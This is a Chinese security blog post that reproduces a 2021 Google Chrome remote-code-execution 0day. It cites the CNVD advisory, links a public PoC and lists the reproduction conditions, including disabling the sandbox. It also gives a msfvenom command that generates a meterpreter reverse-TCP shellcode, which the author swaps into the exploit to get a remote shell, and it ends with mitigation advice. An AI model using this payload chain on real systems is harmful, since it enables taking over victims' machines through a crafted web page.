## **​概述**

国家信息安全漏洞共享平台（CNVD）收录了 Google Chrome
远程代码执行漏洞。未经身份验证的攻击者利用该漏洞，可通过精心构造恶意页面，诱导受害者访问，实现对浏览器的远程代码执行攻击 ,
但攻击者单独利用该漏洞无法实现沙盒（SandBox）逃逸。沙盒是 Google Chrome
浏览器的安全边界，防止恶意攻击代码破坏用户系统或者浏览器其他页面。Google Chrome 浏览器默认开启沙盒保护模式。CNVD 对该漏洞的综合评级为
“高危”。

##  **详情**

2021年4月13日，国外安全研究员发布了关于Google Chrome远程代码执行0Day漏洞的PoC详情。Google
Chrome是由Google开发的免费网页浏览器。此漏洞影响Chrome最新正式版（89.0.4389.128）以及所有低版本，攻击者可通过构造特殊的Web页面，诱导受害者访问，从而达到远程代码执行的目的。

根据作者所述，还有一个过沙盒的版本。

![v2-b01af91b8c447656bedc25aea4c20520_720w.jpg](https://image.3001.net/images/20210420/1618898879_607e6fbfde17003b69db1.jpg!small)

##  **Google Chrome 0day 远程代码执行漏洞复现**

根据给出的poc复现此漏洞。

###  **条件**

> 1.环境win10、win7均可，sever不行
>
> 2.关闭沙箱模式--no-sandbox
>
> 3.chrome客户端需64位（Google Chrome < = 89.0.4389.128）

###  **复现**

Poc：https://github.com/r4j0x00/exploits/tree/master/chrome-0day

通过--no-sandbox命令关闭沙箱

![v2-3a976e634c369033d579773a5927f74b_720w.jpg](https://image.3001.net/images/20210420/1618898880_607e6fc05975e4ae5f5b9.jpg!small)

###  **上线msf**

![v2-b0820484858fd614cea57f768983fb73_720w.jpg](https://image.3001.net/images/20210420/1618898880_607e6fc0a937c31f0a098.jpg!small)

将shellcode换成msf所生成的shellcode

    
    
    Msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.89.130 lport=4444 -f csharp -o payload3.txt

![v2-b7b7535f149657131a4f3deb226b98df_720w.jpg](https://image.3001.net/images/20210420/1618898881_607e6fc141d3f3c901828.jpg!small)

将shellcode进行替换

![v2-67dbd157ff20cd10861ba92789dfa861_720w.jpg](https://image.3001.net/images/20210420/1618898881_607e6fc1a62f931b366b6.jpg!small)

成功上线

![v2-78f54c6b1d830f2083e2215552d9809e_720w.jpg](https://image.3001.net/images/20210420/1618898882_607e6fc210fb7073c70d2.jpg!small)

##  **临时解决方案**

● 建议用户避免打开来历不明的网页链接以及避免点击来源不明的邮件附件；

● 建议用户在虚拟机中执行Google Chrome浏览器；

● 持续关注Google Chrome官方网站更新动态，及时完成更新。

